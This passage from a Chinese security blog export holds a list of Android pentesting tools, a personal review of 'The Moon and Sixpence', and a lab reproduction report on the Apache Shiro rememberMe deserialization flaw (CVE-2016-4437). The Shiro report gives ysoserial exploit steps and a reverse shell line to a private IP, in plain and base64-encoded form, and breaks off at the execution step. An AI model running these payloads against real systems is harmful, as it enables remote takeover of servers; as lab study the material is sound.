<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Android渗透工具</title>
    <url>/2020/09/05/Android%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p><strong>参考文章：<a href="https://gbhackers.com/android-security-penetration-testing/">https://gbhackers.com/android-security-penetration-testing/</a></strong></p>
<h2 id="一、在线分析工具"><a href="#一、在线分析工具" class="headerlink" title="一、在线分析工具"></a><strong>一、在线分析工具</strong></h2><ol>
<li><a href="http://andrototal.org/">AndroTotal</a></li>
<li><a href="http://tracedroid.few.vu.nl/">Tracedroid</a></li>
<li><a href="http://www.visualthreat.com/">Visual Threat</a></li>
<li><a href="http://www.mobilemalware.com.br/analysis/index_en.php">Mobile Malware Sandbox</a></li>
<li><a href="https://www.appknox.com/">Appknox</a> - 收费</li>
<li><a href="https://appscan.bluemix.net/mobileAnalyzer">IBM Security AppScan Mobile Analyzer</a> - 收费</li>
<li><a href="https://apkscan.nviso.be/">NVISO ApkScan</a> </li>
<li><a href="http://undroid.av-comparatives.info/">AVC UnDroid</a> </li>
<li><a href="https://habo.qq.com/">habo</a> - 10/day</li>
<li><a href="https://www.virustotal.com/">Virustotal</a> - 最大128MB</li>
<li><a href="http://app-ray.co/">Fraunhofer App-ray</a> - 收费</li>
<li><a href="https://appcritique.boozallen.com/">AppCritique</a> - 上传Android APK并进行免费的安全评估</li>
<li><a href="https://www.nowsecure.com/blog/2016/09/19/announcing-nowsecure-lab-automated/">NowSecure Lab Automated</a> – 对于Android和iOS移动应用程序进行安全测试，该工具可以自动对上传的软件进行静态和动态分析并返回扫描结果；收费</li>
</ol>
<h2 id="二、静态分析工具"><a href="#二、静态分析工具" class="headerlink" title="二、静态分析工具"></a><strong>二、静态分析工具</strong></h2><ol>
<li><a href="https://github.com/maaaaz/androwarn/">Androwarn</a> – 检测并警告用户有关Android应用程序开发的潜在恶意行为</li>
<li><a href="https://github.com/sonyxperiadev/ApkAnalyser">ApkAnalyser</a></li>
<li><a href="https://github.com/honeynet/apkinspector/">APKInspector</a></li>
<li><a href="https://www.cert.org/secure-coding/tools/didfail.cfm">Droid Intent Data Flow Analysis for Information Leakage</a></li>
<li><a href="https://bitbucket.org/srl/droidlegacy">DroidLegacy</a></li>
<li><a href="http://siis.cse.psu.edu/tools.html">Several tools from PSU</a></li>
<li><a href="https://github.com/EugenioDelfa/Smali-CFGs">Smali CFG generator</a></li>
<li><a href="https://blogs.uni-paderborn.de/sse/tools/flowdroid/">FlowDroid</a></li>
<li><a href="https://www.pnfsoftware.com/">Android Decompiler</a> – 收费</li>
<li><a href="http://pscout.csl.toronto.edu/">PSC</a><a href="http://pscout.csl.toronto.edu/">out – A tool that extracts the permission specification from the And</a> - 使用静态分析从Android源码中提取ACL</li>
<li><a href="http://amandroid.sireum.org/">Amandroid</a></li>
<li><a href="https://github.com/dorneanu/smalisca">SmaliSCA</a> – Smali 静态代码分析</li>
<li><a href="https://github.com/douggard/CFGScanDroid">CFGScanDroid</a> – 扫描并比较CFG与恶意程序的CFG</li>
<li><a href="https://github.com/maldroid/maldrolyzer">Madrolyzer</a> – 提取敏感的数据，例如：C&amp;C、电话等</li>
<li><a href="https://www.cs.washington.edu/sparta">SPARTA</a> – 验证应用程序满足信息安全策略</li>
<li><a href="https://github.com/JulianSchuette/ConDroid">ConDroid</a> – 执行符号+具体执行的组合</li>
<li><a href="https://github.com/serval-snt-uni-lu/DroidRA">DroidRA</a></li>
<li><a href="https://github.com/ClaudiuGeorgiu/RiskInDroid">RiskInDroid</a> – 一种用于根据Android应用程序ACL并检测其风险的工具，提供在线演示</li>
<li><a href="https://github.com/SUPERAndroidAnalyzer/super">SUPER</a> – 安全、统一、功能强大且可扩展的分析工具</li>
<li><a href="https://github.com/google/android-classyshark">ClassyShark</a> – 独立的二进制检查工具，可以浏览任何Android可执行文件并显示重要信</li>
</ol>
<h2 id="三、Android漏洞扫描工具"><a href="#三、Android漏洞扫描工具" class="headerlink" title="三、Android漏洞扫描工具"></a><strong>三、Android漏洞扫描工具</strong></h2><ol>
<li><p><a href="https://github.com/linkedin/qark/">QARK</a> – LinkedIn的QARK是为应用程序开发人员扫描应用程序的安全问题</p>
</li>
<li><p><a href="https://github.com/AndroBugs/AndroBugs_Framework">AndroBugs</a></p>
</li>
<li><p><a href="https://github.com/google/nogotofail">Nogotofail</a></p>
</li>
<li><p><a href="https://devknox.io/">Devknox</a> – 自动纠正Android的安全问题</p>
</li>
<li><p><a href="https://github.com/flankerhqd/JAADAS">JAADAS</a> – 程序内和程序间联合程序分析工具，可基于Soot和Scala查找Android应用程序中的漏洞</p>
</li>
</ol>
<h2 id="四、动态分析工具"><a href="#四、动态分析工具" class="headerlink" title="四、动态分析工具"></a><strong>四、动态分析工具</strong></h2><ol>
<li><p><a href="http://www.mulliner.org/blog/blosxom.cgi/security/androiddbiv02.html">Android DBI framework</a></p>
</li>
<li><p><a href="https://github.com/sh4hin/Androl4b">Androl4b</a> – 用于评估Android应用程序、逆向工程和恶意软件分析的虚拟机</p>
</li>
<li><p><a href="http://www.mobilemalware.com.br/amat/download.html">Android Malware Analysis Toolkit</a> – (Linux distro) Earlier it use to be an <a href="http://dunkelheit.com.br/amat/analysis/index_en.php">online analyzer</a></p>
</li>
<li><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">Mobile-Security-Framework MobSF</a> – 自动测试框架，能够执行静态、动态分析和Web API测试</p>
</li>
<li><p><a href="https://appsec-labs.com/AppUse/">AppUse</a> – 为渗透定制架构</p>
</li>
<li><p><a href="https://thecobraden.com/projects/cobradroid/">Cobradroid</a> – 用于恶意软件分析的自定义图像</p>
</li>
<li><p>~~~~<a href="https://github.com/pjlantz/droidbox">Droidbox</a></p>
</li>
<li><p><a href="https://github.com/mwrlabs/drozer">Drozer</a></p>
</li>
<li><p><a href="https://forum.xda-developers.com/xposed/xposed-installer-versions-changelog-t2714053">Xposed</a> – 相当于进行基于存根的代码注入，但不修改二进制代码</p>
</li>
<li><p><a href="https://github.com/ac-pm/Inspeckage">Inspeckage</a> – Android包检查器——动态分析api钩子，启动未导出的活动等等。(Xposed模块)</p>
</li>
<li><p><a href="https://github.com/AndroidHooker/hooker">Android Hooker</a> – 动态Java代码检测</p>
</li>
<li><p><a href="https://github.com/ZSShen/ProbeDroid">ProbeDroid</a> – 动态Java代码检测</p>
</li>
<li><p><a href="https://androidtamer.com/">Android Tamer</a> – 为Android安全专业人士提供的虚拟/实时平台</p>
</li>
<li><p><a href="https://github.com/sycurelab/DECAF">DECAF</a> – 基于QEMU的动态可执行代码分析框架(DroidScope现在是DECAF的扩展)</p>
</li>
<li><p><a href="https://github.com/idanr1986/cuckoo-droid">CuckooDroid</a> – Cuckoo沙盒的Android扩展</p>
</li>
<li><p><a href="https://github.com/MobileForensicsResearch/mem">Mem</a> – Android安全内存分析(需要root用户)</p>
</li>
<li><p><a href="http://www.ida.liu.se/labs/rtslab/publications/2011/spsm11-burguera.pdf">Crowdroid</a> – 无法找到实际的工具</p>
</li>
<li><p><a href="https://github.com/nwhusted/AuditdAndroid">AuditdAndroid</a> – auditd的android端口，不再处于活跃开发状态</p>
</li>
<li><p><a href="https://code.google.com/p/asef/">AndroidSecurity Evaluation Framework</a></p>
</li>
<li><p><a href="https://redmine.honeynet.org/projects/are/wiki">Android Reverse Engineering</a></p>
</li>
<li><p><a href="https://github.com/xurubin/aurasium">Aurasium</a> – 通过字节码重写和就地引用监视器为Android应用实施实际的安全策略。</p>
</li>
<li><p><a href="https://github.com/strazzere/android-lkms">Android Linux Kernel modules</a></p>
</li>
<li><p><a href="https://manifestsecurity.com/appie/">Appie</a> – Appie是一个预先配置为Android Pentesting环境的软件包。它是完全便携式的，可以通过u盘或智能手机携带。这是Android应用程序安全评估所需的所有工具的一站式答案，也是现有虚拟机的一个极好的替代品。</p>
</li>
<li><p><a href="https://github.com/zyrikby/StaDynA">StaDynA</a> – 一个支持动态代码更新特性(动态类加载和反射)下的安全应用分析系统。该工具结合了Android应用的静态和动态分析，以揭示隐藏/更新的行为，并利用这些信息扩展静态分析结果。</p>
</li>
<li><p><a href="https://github.com/zhengmin1989/DroidAnalytics">DroidAnalytics</a></p>
</li>
<li><p><a href="https://github.com/oguzhantopgul/Vezir-Project">Vezir Project</a> – 虚拟机用于手机应用程序测试和手机恶意软件分析</p>
</li>
<li><p><a href="https://github.com/xtiankisutsa/MARA_Framework">MARA</a> – 移动应用逆向工程与分析框架</p>
</li>
<li><p><a href="http://appanalysis.org/download.html">Taintdroid</a>  – 需要AOSP编译</p>
</li>
</ol>
<h2 id="五、逆向工具"><a href="#五、逆向工具" class="headerlink" title="五、逆向工具"></a><strong>五、逆向工具</strong></h2><ol>
<li><p><a href="https://github.com/JesusFreke/smali">Smali/Baksmali</a> – APK反编译</p>
</li>
<li><p><a href="https://github.com/strazzere/Emacs-Smali">emacs syntax coloring for smali files</a></p>
</li>
<li><p><a href="http://codetastrophe.com/smali.vim">vim syntax coloring for smali files</a></p>
</li>
<li><p><a href="https://github.com/swdunlop/AndBug">AndBug</a></p>
</li>
<li><p><a href="https://github.com/androguard/androguard">Androguard</a> – 功能强大，并且可与其他工具很好的集成</p>
</li>
<li><p><a href="https://ibotpeaches.github.io/Apktool/">Apktool</a> – 对于编译/反编译非常有用(使用smali)</p>
</li>
<li><p><a href="https://github.com/appknox/AFE">Android Framework for Exploitation</a></p>
</li>
<li><p><a href="https://github.com/iSECPartners/Android-KillPermAndSigChecks">Bypass signature and permission checks for IPCs</a></p>
</li>
<li><p><a href="https://github.com/iSECPartners/Android-OpenDebug">Android OpenDebug</a> – 使设备上的任何应用程序可调试(使用cydia基板)。</p>
</li>
<li><p><a href="http://siis.cse.psu.edu/dare/index.html">Dare</a> – 将.dex 转换为 .class</p>
</li>
<li><p><a href="https://github.com/pxb1988/dex2jar">Dex2Jar</a> – 将.dex 转换为 .class</p>
</li>
<li><p><a href="https://github.com/google/enjarify">Enjarify</a> – 将.dex 转换为 .class（Chrome）</p>
</li>
<li><p><a href="http://dedexer.sourceforge.net/">Dedexer</a></p>
</li>
<li><p><a href="https://github.com/sysdream/fino">Fino</a></p>
</li>
<li><p><a href="https://www.frida.re/">Frida</a> – 为它注入javascript来探索应用程序和一个<a href="https://github.com/antojoseph/diff-gui">GUI工具</a></p>
</li>
<li><p><a href="https://bitbucket.org/aseemjakhar/indroid">Indroid</a> – 线程注入设备</p>
</li>
<li><p><a href="https://www.nccgroup.trust/us/about-us/resources/intent-sniffer/">IntentSniffer</a></p>
</li>
<li><p><a href="https://github.com/iSECPartners/Introspy-Android">Introspy</a></p>
</li>
<li><p><a href="https://varaneckas.com/jad/">Jad</a></p>
</li>
<li><p><a href="https://github.com/java-decompiler/jd-gui">JD-GUI</a></p>
</li>
<li><p><a href="http://www.benf.org/other/cfr/">CFR</a></p>
</li>
<li><p><a href="https://github.com/Storyyeller/Krakatau">Krakatau</a></p>
</li>
<li><p>[Procyon](<a href="https://bitbucket.org/mstrobel/procyon/wiki/Java">https://bitbucket.org/mstrobel/procyon/wiki/Java</a> Decompiler)</p>
</li>
<li><p><a href="https://github.com/fesh0r/fernflower">FernFlower</a></p>
</li>
<li><p><a href="https://github.com/plum-umd/redexer">Redexer</a></p>
</li>
<li><p><a href="http://blog.avlyun.com/wp-content/uploads/2014/04/SmaliViewer.zip">Smali viewer</a></p>
</li>
<li><p>~~~~<a href="https://github.com/CalebFenton/simplify">Simplify Android deobfuscator</a></p>
</li>
<li><p><a href="https://github.com/Konloch/bytecode-viewer">Bytecode viewer</a></p>
</li>
<li><p><a href="https://github.com/radare/radare2">Radare2</a></p>
</li>
</ol>
<h2 id="六、模糊测试工具"><a href="#六、模糊测试工具" class="headerlink" title="六、模糊测试工具"></a><strong>六、模糊测试工具</strong></h2><ol>
<li><p><a href="https://www.nccgroup.trust/us/about-us/resources/intent-fuzzer/">IntentFuzzer</a></p>
</li>
<li><p><a href="https://github.com/anestisb/radamsa-android">Radamsa Fuzzer</a></p>
</li>
<li><p><a href="https://github.com/google/honggfuzz">Honggfuzz</a></p>
</li>
<li><p><a href="https://github.com/anestisb/melkor-android">An Android port of the melkor ELF fuzzer</a></p>
</li>
<li><p><a href="https://github.com/fuzzing/MFFA">Media Fuzzing Framework for Android</a></p>
</li>
<li><p><a href="https://github.com/jonmetz/AndroFuzz">AndroFuzz</a></p>
</li>
</ol>
<h2 id="七、应用包装检测工具"><a href="#七、应用包装检测工具" class="headerlink" title="七、应用包装检测工具"></a><strong>七、应用包装检测工具</strong></h2><p><a href="https://github.com/zyrikby/FSquaDRA">FSquaDRA</a> - 基于应用程序资源哈希比较检测重新打包的Android应用程序的Android安全工具。</p>
<h2 id="八、下载市场爬虫"><a href="#八、下载市场爬虫" class="headerlink" title="八、下载市场爬虫"></a><strong>八、下载市场爬虫</strong></h2><ol>
<li><p><a href="https://github.com/Akdeniz/google-play-crawler">Google play crawler (Java)</a></p>
</li>
<li><p><a href="https://github.com/egirault/googleplay-api">Google play crawler (Python)</a></p>
</li>
<li><p><a href="https://github.com/dweinstein/node-google-play">Google play crawler (Node) </a>– 获取应用程序详细信息并从官方Google Play商店下载应用程序</p>
</li>
<li><p><a href="https://github.com/dweinstein/node-aptoide">Aptoide downloader (Node)</a> – 从Aptoide第三方Android市场下载应用程序</p>
</li>
<li><p><a href="https://github.com/dweinstein/node-appland">Appland downloader (Node)</a> – 从Apland第三方Android市场下载应用程序</p>
</li>
</ol>
<h2 id="九、杂项工具"><a href="#九、杂项工具" class="headerlink" title="九、杂项工具"></a><strong>九、杂项工具</strong></h2><ol>
<li> <a href="http://androidcracking.blogspot.com/2011/03/original-smalihook-java-source.html">smalihook</a></li>
<li> <a href="http://codekiem.com/2012/02/24/apk-downloader/">APK-Downloader</a></li>
<li> <a href="http://code.google.com/p/android4me/downloads/detail?name=AXMLPrinter2.jar">AXMLPrinter2</a> – 将二进制XML文件转换为可读的XML文件</li>
<li> <a href="https://github.com/mbrubeck/android-completion">adb autocomplete</a></li>
<li> <a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html">Dalvik opcodes</a></li>
<li> <a href="http://ww38.xchg.info/corkami/opcodes_tables.pdf">Opcodes table for quick reference</a></li>
<li> <a href="http://securitycompass.github.io/AndroidLabs/setup.html">ExploitMe Android Labs</a></li>
<li> <a href="https://github.com/jackMannino/OWASP-GoatDroid-Project">GoatDroid</a></li>
<li> <a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a></li>
<li> <a href="https://github.com/dweinstein/dockerfile-androguard">dockerfile/androguard</a></li>
<li> <a href="https://github.com/AndroidVTS/android-vts">Android Vulnerability Test Suite</a> – android-vts扫描设备的一组漏洞</li>
<li> <a href="https://github.com/dpnishant/appmon">AppMon</a> – AppMon是一个用于监控和篡改本地macOS、iOS和android应用的系统API调用的自动化框架。它是基于Frida。</li>
</ol>
<h2 id="十、学术、研究、出版物、书籍"><a href="#十、学术、研究、出版物、书籍" class="headerlink" title="十、学术、研究、出版物、书籍"></a><strong>十、学术、研究、出版物、书籍</strong></h2><h3 id="10-1-调查报告"><a href="#10-1-调查报告" class="headerlink" title="10.1 调查报告"></a>10.1 调查报告</h3><ol>
<li><p><a href="https://www.exploit-db.com/papers/">Exploit Database</a></p>
</li>
<li><p><a href="https://github.com/jacobsoo/AndroidSlides">Androidsecurity related presentations</a></p>
</li>
<li><p><a href="https://tthtlc.wordpress.com/2011/09/01/static-analysis-of-android-applications/">A good collection of static analysis papers</a></p>
</li>
</ol>
<h3 id="10-2-图书"><a href="#10-2-图书" class="headerlink" title="10.2 图书"></a>10.2 图书</h3><p><a href="https://www.securecoding.cert.org/confluence/display/android/Android+Secure+Coding+Standard">SEI CERT Android Secure Coding Standard</a></p>
<h3 id="10-3-其他"><a href="#10-3-其他" class="headerlink" title="10.3 其他"></a>10.3 其他</h3><ol>
<li><a href="https://github.com/OWASP/owasp-mstg">OWASP Mobile Security Testing Guide Manual</a></li>
<li><a href="http://www.fasteque.com/android-reverse-engineering-101-part-1/">Android Reverse Engineering 101 by Daniele Altomare</a></li>
<li><a href="https://github.com/doridori/Android-Security-Reference">doridori/Android-Security-Reference</a></li>
<li><a href="https://github.com/b-mueller/android_app_security_checklist">android app security checklist</a></li>
<li><a href="https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet">Mobile App Pentest Cheat Sheet</a></li>
</ol>
<h2 id="十一、开发漏洞利用"><a href="#十一、开发漏洞利用" class="headerlink" title="十一、开发漏洞利用"></a><strong>十一、开发漏洞利用</strong></h2><h3 id="11-1-清单"><a href="#11-1-清单" class="headerlink" title="11.1 清单"></a>11.1 清单</h3><ol>
<li><a href="https://source.android.com/security/bulletin/">AndroidSecurity Bulletins</a></li>
<li><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-1224/product_id-19997/Google-Android.html">Android’s reported security vulnerabilities</a></li>
<li><a href="https://kb.androidtamer.com/Device_Security_Patch_tracker/">Android Devices Security Patch Status</a></li>
<li><a href="https://code.google.com/p/android/issues/list?can=2&q=priority=Critical&sort=-opened">AOSP – Issue tracker</a></li>
<li><a href="https://www.owasp.org/index.php/Mobile_Top_10_2016-Top_10">OWASP Mobile Top 10 2016</a></li>
<li><a href="https://www.exploit-db.com/search/?action=search&q=android">Exploit Database</a></li>
<li><a href="https://docs.google.com/spreadsheet/pub?key=0Am5hHW4ATym7dGhFU1A4X2lqbUJtRm1QSWNRc3E0UlE&single=true&gid=0&output=html">Vulnerability Google Doc</a></li>
<li><a href="https://source.android.com/security/reports/Google_Android_Security_PHA_classifications.pdf">Google AndroidSecurity Team’s Classifications for Potentially Harmful Applications (Malware)</a></li>
</ol>
<h3 id="11-2-恶意软件"><a href="#11-2-恶意软件" class="headerlink" title="11.2 恶意软件"></a>11.2 恶意软件</h3><ol>
<li><p><a href="https://code.google.com/p/androguard/wiki/DatabaseAndroidMalwares">androguard – Database Android Malwares wiki</a></p>
</li>
<li><p><a href="https://github.com/ashishb/android-malware">Android Malware Github repo</a></p>
</li>
<li><p><a href="http://www.malgenomeproject.org/policy.html">Android Malware Genome Project</a> – 包含1260个恶意样本</p>
</li>
<li><p><a href="http://contagiominidump.blogspot.com/">Contagio Mobile Malware Mini Dump</a></p>
</li>
<li><p><a href="https://www.virustotal.com/en/about/contact/">VirusTotal Malware Intelligence Service</a> – 付费</p>
</li>
<li><p><a href="http://admire.necst.it/">Admire</a></p>
</li>
<li><p><a href="https://www.sec.cs.tu-bs.de/~danarp/drebin/">Drebin</a></p>
</li>
</ol>
<h2 id="十二、赏金计划"><a href="#十二、赏金计划" class="headerlink" title="十二、赏金计划"></a><strong>十二、赏金计划</strong></h2><p><a href="https://www.google.com/about/appsecurity/android-rewards/">AndroidSecurity Reward Program</a></p>
<h2 id="十三、如何提交漏洞"><a href="#十三、如何提交漏洞" class="headerlink" title="十三、如何提交漏洞"></a><strong>十三、如何提交漏洞</strong></h2><ol>
<li><a href="https://source.android.com/security/overview/updates-resources.html#report-issues">Android – reporting security issues</a></li>
<li><a href="https://github.com/B3nac/Android-Reports-and-Resources">Android Reports and Resources</a> – Android Hackerone披露报告列表等资源</li>
</ol>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>月亮与六便士第一遍观后感</title>
    <url>/2020/09/04/%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB%E7%AC%AC%E4%B8%80%E9%81%8D%E8%A7%82%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<p>在机场的时候去早了很无聊，然后就找了个书店，买的其中一本书《月亮与六便士》</p>
<p>这本书很短，至少翻译出来很短，而且，原文是法文，所以翻译出来可能有些许翻译者自带的情绪和理解。我读的版本是苏福忠译。说来惭愧，英语太烂，不能全文通读。希望第二遍有这个机会写一篇英文观后感。</p>
<p>这本书，倒也不是给我很深的感觉，大概，在我的理解范围之内，也在我的理解范围之外。查尔斯的性格、德克的包容、“我”的交往方式、还有德克妻子的举动、查尔斯最后一任妻子的执着，都是我不理解的，但也是我能理解。</p>
<p>我其实很能理解查尔斯的背弃家庭追求向往已久的画家生活，哪怕是那么穷困潦倒不切实际，但是，至少，他有那个勇气，他的心灵和灵魂，是超乎常理的，他根本不把生死看在眼里，也不会在意周围的环境，他只是在追求自己想要的东西，甚至到了最后，得了该死的疾病，也还是不舍弃的在画画。我是没有那个勇气的，但和他相同的，我也有自己想要搞清楚的事情，只是一直表达不出来。在内心深处，我也想要不顾及所有人的一切来找寻某个东西。我能理解他的无情。我是一个常人，光是从考虑其他人的感受来说，我和德克一样，有一个多管闲事的“圣母心”，无法摆脱。我在读书的时候，会试着去进入某一个角色感受某一件事情，于是，我进入状态感受了德克在被妻子抛弃，被自己认为是天才的人无视的感觉，如果是我，我会很愤怒也很绝望，甚至会和德克一样一次又一次的去找妻子，会很憎恨查尔斯，会不再和他来往。但最后德克在离开法国准备回家的时候，却邀请查尔斯的时候，我，是不能理解的，我也不知道，自己会不会原谅他，就算是出于对天才的怜惜，我想我也会犹豫很久。</p>
<p>从外人的角度来看查尔斯，我很讨厌很讨厌他。但如果将自己代入查尔斯，却又是一件很舒服的事情，各个方面。我无法描述太多，那是一种特别的感觉，让我贪婪的觉得，如果我也如此该多好。可惜我不是天才，我得不到德克的追捧，也没有他第三任妻子的忠诚，更不能摆脱家庭。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
        <category>观后感</category>
      </categories>
      <tags>
        <tag>喜欢</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro复现报告</title>
    <url>/2020/08/14/shiro%E5%A4%8D%E7%8E%B0%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<p>这里有一个我找到的docker环境，推荐大家使用</p>
<p>vulhub/shiro    1.2.4   331MB</p>
<h4 id="关于反序列化"><a href="#关于反序列化" class="headerlink" title="关于反序列化"></a>关于反序列化</h4><p>在序列化与反序列化的过程中，会有一个问题，就是在反序列化的时候会自动执行类的readObject方法。如果我们在readObject中有恶意的操作，即可造成攻击。</p>
<h4 id="介绍shiro"><a href="#介绍shiro" class="headerlink" title="介绍shiro"></a>介绍shiro</h4><p>Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。Apache Shiro框架提供了记住我（RememberMe）的功能，关闭浏览器再次访问时无需再登录即可访问。shiro默认使用CookieRememberMeManager，对rememberMe的cookie做了加密处理，在CookieRememberMeManaer类中将cookie中rememberMe字段内容先后进行序列化、AES加密、Base64编码操作。服务器端识别身份解密处理cookie的流程则是：</p>
 <span id="more"></span> 

<p>（1）获取rememberMe cookie</p>
<p>（2）base64 解码</p>
<p>（3）AES解密（加密密钥硬编码）</p>
<p>（4）反序列化（未作过滤处理）</p>
<p>但是AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生。</p>
<p>CVE-2016-4437</p>
<p>漏洞影响版本：</p>
<p>Apache Shiro &lt;= 1.2.4</p>
<p>它的原理有些复杂，，，我还真不知道自己理解的对不对，大家可以参考下边我的想法（结合这篇公众号文章理解）</p>
<p>本人理解：大概就是因为程序里面因为Ａ类定义的ａ方法直接传入了一个对象，并且没有进行反序列化，然后恰巧有这么一个类Ｂ它的构造方法是直接放回传入的参数，它的ａ方法也是直接返回传入的参数。那么也就是说 把xx.class 传入 B作为这个方法的数组的起点，通过第一次的ａ方法，就可以直接得到某个东西。后面再利用循环调用ａ就可以通过反射命令执行。</p>
<p>所以就是说，可以通过循环调用transform方法来执行命令。</p>
<p>然后其中还有很多细节，反正慢慢理解。</p>
<p><a href="https://mp.weixin.qq.com/s/LbBsok1sRRTEJtXMwjx2zg">https://mp.weixin.qq.com/s/LbBsok1sRRTEJtXMwjx2zg</a></p>
<p>（晕了别怪我哈）</p>
<h4 id="漏洞确定"><a href="#漏洞确定" class="headerlink" title="漏洞确定"></a>漏洞确定</h4><p>１．burp抓包查看是否存在rememberMe＝delete me参数</p>
<p>２．shiro工具测试命令执行</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>１．这里我就先直接用雷石安全实验室大佬的现成工具了（白嫖的。。。）</p>
<p>２．这里还有一个可以自行编译，进行利用的工具，由于不知道为什么出错，暂时就没调试（因为懒）</p>
<p><a href="https://github.com/frohoff/ysoserial.git">https://github.com/frohoff/ysoserial.git</a></p>
<p>步骤：</p>
<p>１．先将文件下载至主机中</p>
<p>２．安装”mvn”命令，进行java文件的编译</p>
<p>３．ysoserial-0.0.6-SNAPSHOT-all.jar在/ysoserial/target/下</p>
<p>４．直接java执行命令。进行攻击</p>
<p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 “bash命令”</p>
<p>注意：</p>
<p>payloads/JRMPClient是结合exploit/JRMPListener使用的。</p>
<p>JRMPListener是ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server 。</p>
<p>具体的利用过程是，将反序列化数据发送到 Server中，然后在Server中进行反序列化操作，并开启指定端口，然后再通过JRMPClient去发送攻击 payload；payloads/JRMPClient生成的payload是发送给目标服务器的，exploit/JRMPListener 是在自己的攻击机上使用的。</p>
<p>这里最后的bash命令需要使用Java Runtime配置bash编码（地址:<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89%E3%80%82%E4%B9%8B%E6%89%80%E4%BB%A5%E9%9C%80%E8%A6%81%E7%BC%96%E7%A0%81%E8%80%8C%E4%B8%8D%E6%98%AF%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8bash%E5%91%BD%E4%BB%A4%E6%98%AF%E5%9B%A0%E4%B8%BA%E5%9C%A8exec()%E5%87%BD%E6%95%B0%E4%B8%AD%EF%BC%8C&quot;&gt;&quot;%E7%AE%A1%E9%81%93%E7%AC%A6%E6%98%AF%E6%B2%A1%E6%9C%89%E6%84%8F%E4%B9%89%E7%9A%84%EF%BC%8C%E4%BC%9A%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BA%E5%85%B6%E4%BB%96%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%8C%E8%80%8C%E6%88%91%E4%BB%AC%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E4%B8%AD%E5%8F%88%E5%BF%85%E9%A1%BB%E4%BD%BF%E7%94%A8%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E9%9C%80%E8%A6%81%E7%BC%96%E7%A0%81%E3%80%82">http://www.jackson-t.ca/runtime-exec-payloads.html）。之所以需要编码而不是直接使用bash命令是因为在exec()函数中，&quot;&gt;&quot;管道符是没有意义的，会被解析为其他的意义，而我们的反弹shell命令中又必须使用，所以就需要编码。</a></p>
<p>另外，StringTokenizer类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。比如 ls “My Directory”将被解释为ls ‘“My’ ‘Directory”‘。</p>
<p>（解释这么多，其实大概就是一句话，既然是反序列化，就一定涉及到编码，而编码的时候，管道符和空格会被解析，所以干脆就用编码去绕过）</p>
<p>这里用到的命令是常见的想要获取服务器的shell：</p>
<p>bash -i &gt;&amp; /dev/tcp/192.168.1.103/6666 0&gt;&amp;1</p>
<p>编码后：</p>
<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAzLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}</p>
<p>执行：</p>
